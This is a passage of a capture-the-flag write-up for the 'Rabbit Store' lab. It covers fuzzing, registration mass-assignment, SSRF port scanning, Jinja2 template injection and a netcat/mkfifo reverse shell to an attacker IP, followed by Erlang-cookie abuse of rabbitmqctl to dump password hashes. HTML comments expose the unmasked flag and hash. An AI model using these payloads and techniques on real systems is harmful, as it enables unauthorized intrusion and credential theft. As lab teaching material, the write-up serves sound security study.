+</span></span><span class="line"><span class="cl">.htpasswd               <span class="o">[</span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 254ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.htaccess               <span class="o">[</span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 254ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">assets                  <span class="o">[</span>Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 147ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">javascript              <span class="o">[</span>Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 232ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">server-status           <span class="o">[</span>Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 152ms<span class="o">]</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ffuf -c -u http://storage.cloudsite.thm/FUZZ -w /usr/share/wordlists/dirb/big.txt
+</span></span><span class="line"><span class="cl">.htaccess               <span class="o">[</span>Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 158ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">.htpasswd               <span class="o">[</span>Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 222ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">assets                  <span class="o">[</span>Status: 301, Size: 331, Words: 20, Lines: 10, Duration: 150ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">css                     <span class="o">[</span>Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 149ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">fonts                   <span class="o">[</span>Status: 301, Size: 330, Words: 20, Lines: 10, Duration: 239ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">images                  <span class="o">[</span>Status: 301, Size: 331, Words: 20, Lines: 10, Duration: 179ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">javascript              <span class="o">[</span>Status: 301, Size: 335, Words: 20, Lines: 10, Duration: 147ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">js                      <span class="o">[</span>Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 153ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">server-status           <span class="o">[</span>Status: 403, Size: 286, Words: 20, Lines: 10, Duration: 145ms<span class="o">]</span>
+</span></span></code></pre></div><p>Here, <code>javascript</code> and <code>server-status</code> look interesting to me. Let&rsquo;s analyze these further.</p>
+<h3 id="account-login">Account Login</h3>
+<p>Let&rsquo;s try to log in using a random username and password to analyze the response.
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/3.png" title="Login page" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Login page</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>We are receiving a generic message: <code>Invalid Username or Password</code> for incorrect login attempts.</p>
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/4.png" title="Incorrect Login" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Incorrect Login</strong>
+    </figcaption>  
+</figure>
+
+<p>Here, the user is able to log in at the <code>/api/login</code> endpoint. Let&rsquo;s fuzz the <code>/api/</code> endpoint.</p>
+<h3 id="ffuf2">ffuf2</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ffuf -c -u http://storage.cloudsite.thm/api/FUZZ -w /usr/share/wordlists/dirb/big.txt
+</span></span><span class="line"><span class="cl">Login                   <span class="o">[</span>Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 152ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">docs                    <span class="o">[</span>Status: 403, Size: 27, Words: 2, Lines: 1, Duration: 156ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">login                   <span class="o">[</span>Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 166ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">register                <span class="o">[</span>Status: 405, Size: 36, Words: 4, Lines: 1, Duration: 149ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl">uploads                 <span class="o">[</span>Status: 401, Size: 32, Words: 3, Lines: 1, Duration: 151ms<span class="o">]</span>
+</span></span></code></pre></div><p>Here, <code>docs</code> and <code>uploads</code> seem to be interesting endpoints.</p>
+<p>We also have a <code>Sign Up</code> button for registering a new user. Let&rsquo;s sign up a new user.
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/5.png" title="Sign Up" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Sign Up</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>We have captured the new user registration request using Burp Suite for further analysis, and we received a <code>user registered successfully</code> response.</p>
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/7.png" title="BurpSuite - New user registration" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>BurpSuite - New user registration</strong>
+    </figcaption>  
+</figure>
+
+<p>When trying to log in using the credentials we registered, we received a response saying <code>inactive</code>.
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/8.png" title="BurpSuite - Login" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>BurpSuite - Login</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>We can also see the <code>JWT token</code> in the response of the login, where the <code>subscription</code> parameter is set to <code>inactive</code>. This is likely the reason for the <code>inactive</code> response.
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/9.png" title="BurpSuite - Login (JSON Web Token)" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>BurpSuite - Login (JSON Web Token)</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>We need the secret key to modify the JWT token, but so far, we don&rsquo;t have any clues about the secret key.</p>
+<p>Okay, here let&rsquo;s try to register a new user by adding <code>&quot;subscription&quot;: &quot;active&quot;</code> in the request. By doing so, the user was registered successfully.</p>
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/10.png" title="BurpSuite - User registration" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>BurpSuite - User registration</strong>
+    </figcaption>  
+</figure>
+
+<p>When logging in with the new credentials, we got an &ldquo;active&rdquo; response.
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/11.png" title="BurpSuite - Successful login" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>BurpSuite - Successful login</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>In the response of the login, we can see that the &ldquo;subscription&rdquo; parameter is now set to &ldquo;active&rdquo;.
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/12.png" title="BurpSuite - Login (JSON Web Token)" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>BurpSuite - Login (JSON Web Token)</strong>
+    </figcaption>  
+</figure>
+</p>
+<h2 id="shell-as-azrael">Shell as azrael</h2>
+<h3 id="ssrf">SSRF</h3>
+<p>We got a <code>Secure File Storage</code> page after successfully logging in with an active subscription.
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/13.png" title="Secure File Storage - Upload file" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Secure File Storage - Upload file</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>We also have the option to upload from a URL.
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/14.png" title="Secure File Storage - Upload from url" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Secure File Storage - Upload from url</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>After providing <code>http://127.0.0.1</code>, we got the resulting file path.
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/16.png" title="Upload from url http://127.0.0.1/" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Upload from url http://127.0.0.1/</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>File paths are added in the <code>Uploaded Files</code> section on the page (you need to refresh to see new items).
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/17.png" title="Secure File Storage - Uploaded Files" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>Secure File Storage - Uploaded Files</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>We got the home page result, which means that the application is able to access the internal server.
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/18.png" title="http://127.0.0.1/ - response" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>http://127.0.0.1/ - response</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>Now, let&rsquo;s try to access the interesting endpoint <code>/api/docs/</code>, which we got during fuzzing. We got an <code>Access Denied</code> error.
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/19.png" title="/apt/docs/ - Access Denied" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>/apt/docs/ - Access Denied</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>When we tried to access <code>http://127.0.0.1/api/docs/</code> using SSRF, we failed to get a result. It may be accessible from a different port.</p>
+<p>Let&rsquo;s try to get the active ports on the localhost of the target using SSRF.</p>
+<h3 id="seq">seq</h3>
+<p><code>seq</code> is a command-line tool that generates a sequence of numbers. Let&rsquo;s save the numbers from 0 to 65535 into a file named <code>ports.txt</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">seq <span class="m">0</span> <span class="m">65535</span> &gt; ports.txt
+</span></span></code></pre></div><h3 id="ffuf3">ffuf3</h3>
+<p>We got 4 result ports during fuzzing.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ ffuf -c -u http://storage.cloudsite.thm/api/store-url -H <span class="s2">&#34;Cookie: jwt=</span><span class="nv">$JWT_TOKEN</span><span class="s2">&#34;</span> -H <span class="s2">&#34;Content-Type: application/json&#34;</span> -d <span class="s2">&#34;{\&#34;url\&#34;:\&#34;http://127.0.0.1:FUZZ/api/docs\&#34;}&#34;</span> -w ports.txt -fc <span class="m">500</span>
+</span></span><span class="line"><span class="cl">________________________________________________
+</span></span><span class="line"><span class="cl"><span class="m">80</span>                      <span class="o">[</span>Status: 200, Size: 106, Words: 5, Lines: 1, Duration: 784ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="m">3000</span>                    <span class="o">[</span>Status: 200, Size: 106, Words: 5, Lines: 1, Duration: 494ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="m">8000</span>                    <span class="o">[</span>Status: 200, Size: 106, Words: 5, Lines: 1, Duration: 343ms<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="m">15672</span>                   <span class="o">[</span>Status: 200, Size: 106, Words: 5, Lines: 1, Duration: 287ms<span class="o">]</span>
+</span></span></code></pre></div><p>We got the expected response from the endpoint <code>/api/docs/</code> on <code>port 3000</code>.
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/21.png" title="BurpSuite - storeurl http://127.0.0.1:3000/api/docs" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>BurpSuite - storeurl http://127.0.0.1:3000/api/docs</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>Here, we found an interesting response from the endpoint <code>/api/fetch_messages_from_chatbot</code>.
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/22.png" title="BurpSuite - response http://127.0.0.1:3000/api/docs" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>BurpSuite - response http://127.0.0.1:3000/api/docs</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>Let&rsquo;s try to reach the endpoint <code>/api/fetch_messages_from_chatbot</code>. We are getting a <code>GET method not allowed</code> response.
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/23.png" title="BurpSuite - GET /api/fetch_messeges_from_chatbot" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>BurpSuite - GET /api/fetch_messeges_from_chatbot</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>Let&rsquo;s try changing the request method to <code>POST</code> and modify the <code>Content-Type</code> to <code>application/json</code>. We got a <code>username parameter is required</code> response.
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/27.png" title="BurpSuite - POST /api/fetch_messeges_from_chatbot" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>BurpSuite - POST /api/fetch_messeges_from_chatbot</strong>
+    </figcaption>  
+</figure>
+</p>
+<h3 id="jinja2---ssti">jinja2 - SSTI</h3>
+<p>Let&rsquo;s add the <code>username</code> parameter in JSON format. Here, we got the expected response without any error.
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/24.png" title="BurpSuite - POST /api/fetch_messeges_from_chatbot" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>BurpSuite - POST /api/fetch_messeges_from_chatbot</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>By providing random inputs, we got an error showing <code>jinja2.exceptions</code>.
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/28.png" title="BurpSuite - /api/fetch_messeges_from_chatbot Error" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>BurpSuite - /api/fetch_messeges_from_chatbot Error</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>We found an exploit for Jinja2 in Searchsploit (ExploitDB) and mirrored it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ searchsploit jinja2  
+</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl"> Exploit Title                                             <span class="p">|</span>  Path
+</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">Jinja2 2.10 - <span class="s1">&#39;from_string&#39;</span> Server Side Template Injection <span class="p">|</span> python/webapps/46386.py
+</span></span><span class="line"><span class="cl">--------------------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">$ searchsploit -m <span class="m">46386</span>
+</span></span><span class="line"><span class="cl">  Exploit: Jinja2 2.10 - <span class="s1">&#39;from_string&#39;</span> Server Side Template Injection
+</span></span><span class="line"><span class="cl">      URL: https://www.exploit-db.com/exploits/46386
+</span></span><span class="line"><span class="cl">     Path: /usr/share/exploitdb/exploits/python/webapps/46386.py
+</span></span><span class="line"><span class="cl">    Codes: CVE-2019-8341
+</span></span><span class="line"><span class="cl"> Verified: False
+</span></span><span class="line"><span class="cl">File Type: Python script, ASCII text executable
+</span></span><span class="line"><span class="cl">Copied to: 46386.py
+</span></span></code></pre></div><p>Let&rsquo;s read the content of <code>46386.py</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat 46386.py                          
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1"># Exploit Title: Jinja2 Command injection from_string function
+</span></span></span><span class="line"><span class="cl"><span class="s1"># Exploit Author: JameelNabbo
+</span></span></span><span class="line"><span class="cl"><span class="s1"># Vendor Homepage: http://jinja.pocoo.org
+</span></span></span><span class="line"><span class="cl"><span class="s1"># Software Link: https://pypi.org/project/Jinja2/#files
+</span></span></span><span class="line"><span class="cl"><span class="s1"># CVE-2019-8341
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">// from_string function is prone to SSTI where it takes the &#34;source&#34; parameter as a template object and render it and then return it.
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">//here&#39;</span>s an example about the vulnerable code that uses from_string <span class="k">function</span> in order to handle a variable in GET called <span class="s1">&#39;username&#39;</span> and returns Hello <span class="o">{</span>username<span class="o">}</span>:
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">import Flask
+</span></span></span><span class="line"><span class="cl"><span class="s1">import request
+</span></span></span><span class="line"><span class="cl"><span class="s1">import Jinja2
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">@app.route(&#34;/&#34;)
+</span></span></span><span class="line"><span class="cl"><span class="s1">def index():
+</span></span></span><span class="line"><span class="cl"><span class="s1">            username = request.values.get(&#39;</span>username<span class="s1">&#39;)
+</span></span></span><span class="line"><span class="cl"><span class="s1">            return Jinja2.from_string(&#39;</span>Hello <span class="s1">&#39; + username).render()
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">if __name__ == &#34;__main__&#34;:
+</span></span></span><span class="line"><span class="cl"><span class="s1">            app.run(host=&#39;</span>127.0.0.1<span class="s1">&#39; , port=4444)
+</span></span></span><span class="line"><span class="cl"><span class="s1">
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>
+</span></span><span class="line"><span class="cl">POC
+</span></span><span class="line"><span class="cl">//Exploiting the username param
+</span></span><span class="line"><span class="cl">http://localhost:4444/?username<span class="o">={{</span>4*4<span class="o">}}</span>
+</span></span><span class="line"><span class="cl">OUTPUT: Hello <span class="m">16</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Reading the /etc/passwd
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">http://localhost:4444/?username<span class="o">={{</span> <span class="s1">&#39;&#39;</span>.__class__.__mro__<span class="o">[</span>2<span class="o">]</span>.__subclasses__<span class="o">()[</span>40<span class="o">](</span><span class="s1">&#39;/etc/passwd&#39;</span><span class="o">)</span>.read<span class="o">()</span> <span class="o">}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Getting a reverse shell
+</span></span><span class="line"><span class="cl">http://localhost:4444/?username<span class="o">={{</span> config<span class="o">[</span><span class="s1">&#39;RUNCMD&#39;</span><span class="o">](</span><span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/8000 0&gt;&amp;1&#39;</span>,shell<span class="o">=</span>True<span class="o">)</span> <span class="o">}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">How to prevent it:
+</span></span><span class="line"><span class="cl">Never <span class="nb">let</span> the user provide template content.
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span><span class="err">&#39;</span> 
+</span></span></code></pre></div><p>When trying all the PoCs, <code>{{4*4}}</code> worked, confirming that the site is vulnerable to SSTI.
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/25.png" title="BurpSuite - SSTI" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>BurpSuite - SSTI</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>We also got a PoC to execute shell commands: <a href="https://github.com/dgtlmoon/changedetection.io/security/advisories/GHSA-4r7v-whpg-8rx3" target="_blank" rel="noopener">Server Side Template Injection in Jinja2 allows Remote Command Execution</a>
+.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;{{ self.__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;id&#39;).read() }}&#34;</span><span class="p">}</span>
+</span></span></code></pre></div><p>We got a response for the shell command.
+
+
+
+
+<figure>
+    <img src="/posts/thm/rabbitstore/26.png" title="BurpSuite - SSTI - Command Execution" style="display: block; margin: 0 auto;">
+    <figcaption class="text-sm text-center text-slate-500 dark:text-slate-300">
+        <strong>BurpSuite - SSTI - Command Execution</strong>
+    </figcaption>  
+</figure>
+</p>
+<p>Let&rsquo;s use RCE payload, to get reverse shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;username&#34;</span><span class="p">:</span><span class="s2">&#34;{{ self.__init__.__globals__.__builtins__.__import__(&#39;os&#39;).popen(&#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.17.62.140 1234 &gt;/tmp/f&#39;).read() }}&#34;</span><span class="p">}</span>
+</span></span></code></pre></div><h3 id="rce">RCE</h3>
+<p>Got a reverse shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ nc -nvlp <span class="m">1234</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">1234</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.17.62.140<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.52.241<span class="o">]</span> <span class="m">48498</span>
+</span></span><span class="line"><span class="cl">sh: 0: can<span class="err">&#39;</span>t access tty<span class="p">;</span> job control turned off
+</span></span><span class="line"><span class="cl">$ id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>azrael<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>azrael<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>azrael<span class="o">)</span>
+</span></span></code></pre></div><h3 id="improving-shell">Improving shell</h3>
+<p>Let&rsquo;s make it an interactive shell.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span><span class="line"><span class="cl">^Z <span class="c1">#(Ctrl+Z)</span>
+</span></span><span class="line"><span class="cl">stty raw -echo <span class="o">&amp;&amp;</span> <span class="nb">fg</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">TERM</span><span class="o">=</span>xterm
+</span></span></code></pre></div><p>Here, we got our first flag.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">azrael@forge:~$ cat user.txt 
+</span></span><span class="line"><span class="cl">98d3****************0c47e
+</span></span></code></pre></div><!-- flag1 98d3a30fa86523c580144d317be0c47e -->
+<h2 id="shell-as-root">Shell as root</h2>
+<h3 id="erlang-cookie">Erlang Cookie</h3>
+<p>When checking for privilege escalation vectors using <a href="https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/linpeas.sh" target="_blank" rel="noopener">linpeas.sh</a>
+, we found an interesting file: <code>/var/lib/rabbitmq/.erlang.cookie</code>. We discovered the Erlang cookie.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">azrael@forge:~$ ls -la /var/lib/rabbitmq/.erlang.cookie
+</span></span><span class="line"><span class="cl">-r-----r-- <span class="m">1</span> rabbitmq rabbitmq /var/lib/rabbitmq/.erlang.cookie
+</span></span><span class="line"><span class="cl">azrael@forge:~$ cat /var/lib/rabbitmq/.erlang.cookie
+</span></span><span class="line"><span class="cl">FzZsOYeeUBDrNNT6
+</span></span></code></pre></div><h3 id="rabbitmqctl">Rabbitmqctl</h3>
+<p>Let&rsquo;s try to get some information from the <code>rabbitmqctl</code> tool. Ref: <a href="https://www.rabbitmq.com/" target="_blank" rel="noopener">Ref1</a>
+, <a href="https://www.rabbitmq.com/docs/man/rabbitmqctl.8#DESCRIPTION" target="_blank" rel="noopener">Ref2</a>
+, <a href="https://www.rabbitmq.com/docs/man/rabbitmqctl.8#list_users" target="_blank" rel="noopener">Ref3</a>
+, <a href="https://www.rabbitmq.com/docs/definitions#export" target="_blank" rel="noopener">Ref4</a>
+,<a href="https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm" target="_blank" rel="noopener">Ref5</a>
+.</p>
+<p>Here, we got information that <code>The password for the root user is the SHA-256 hashed value of the RabbitMQ root user's password.</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo rabbitmqctl --erlang-cookie FzZsOYeeUBDrNNT6 --node rabbit@forge list_users
+</span></span><span class="line"><span class="cl">Listing users ...
+</span></span><span class="line"><span class="cl">user    tags
+</span></span><span class="line"><span class="cl">The password <span class="k">for</span> the root user is the SHA-256 hashed value of the RabbitMQ root user<span class="s1">&#39;s password. Please don&#39;</span>t attempt to crack SHA-256.      <span class="o">[]</span>
+</span></span><span class="line"><span class="cl">root    <span class="o">[</span>administrator<span class="o">]</span>
+</span></span></code></pre></div><p>Let&rsquo;s export the definitions.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo rabbitmqctl --erlang-cookie FzZsOYeeUBDrNNT6 --node rabbit@forge export_definitions ./definitions.json
+</span></span><span class="line"><span class="cl">Exporting definitions in JSON to a file at <span class="s2">&#34;./definitions.json&#34;</span> ...
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ cat definitions.json <span class="p">|</span> jq
+</span></span><span class="line"><span class="cl"><span class="o">{</span>
+</span></span><span class="line"><span class="cl">  ...
+</span></span><span class="line"><span class="cl">  ...
+</span></span><span class="line"><span class="cl">  <span class="s2">&#34;users&#34;</span>: <span class="o">[</span>
+</span></span><span class="line"><span class="cl">    <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;hashing_algorithm&#34;</span>: <span class="s2">&#34;rabbit_password_hashing_sha256&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;limits&#34;</span>: <span class="o">{}</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;name&#34;</span>: <span class="s2">&#34;The password for the root user is the SHA-256 hashed value of the RabbitMQ root user&#39;s password. Please don&#39;t attempt to crack SHA-256.&#34;</span>,                                  
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;password_hash&#34;</span>: <span class="s2">&#34;vyf4qvKLpShONYgEiNc6xT/5rLq+23A2RuuhEZ8N10kyN34K&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;tags&#34;</span>: <span class="o">[]</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>,
+</span></span><span class="line"><span class="cl">    <span class="o">{</span>
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;hashing_algorithm&#34;</span>: <span class="s2">&#34;rabbit_password_hashing_sha256&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;limits&#34;</span>: <span class="o">{}</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;name&#34;</span>: <span class="s2">&#34;root&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;password_hash&#34;</span>: <span class="s2">&#34;49e6h********************9uxhSBHtGU+YBzWF&#34;</span>,
+</span></span><span class="line"><span class="cl">      <span class="s2">&#34;tags&#34;</span>: <span class="o">[</span>
+</span></span><span class="line"><span class="cl">        <span class="s2">&#34;administrator&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="o">]</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">  <span class="o">]</span>,
+</span></span><span class="line"><span class="cl">  ...
+</span></span><span class="line"><span class="cl">  ...
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></div><!-- password hash 49e6hSldHRaiYX329+ZjBSf/Lx67XEOz9uxhSBHtGU+YBzWF -->
+<p>Let&rsquo;s try to decrypt the hash using the <a href="https://www.rabbitmq.com/docs/passwords#this-is-the-algorithm" target="_blank" rel="noopener">Password Algorithm</a>
+.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">echo</span> -n 49e6h********************9uxhSBHtGU+YBzWF <span class="p">|</span> base64 -d <span class="p">|</span> xxd -p -c <span class="m">100</span>
+</span></span><span class="line"><span class="cl">e3d7ba85295d1d16a*************************************98073585
+</span></span></code></pre></div><!-- Above result e3d7ba85295d1d16a2617df6f7e6630527ff2f1ebb5c43b3f6ec614811ed194f98073585 -->
+<p>By removing <code>e3d7ba85</code> (32-bit salt), we get the required hash.</p>
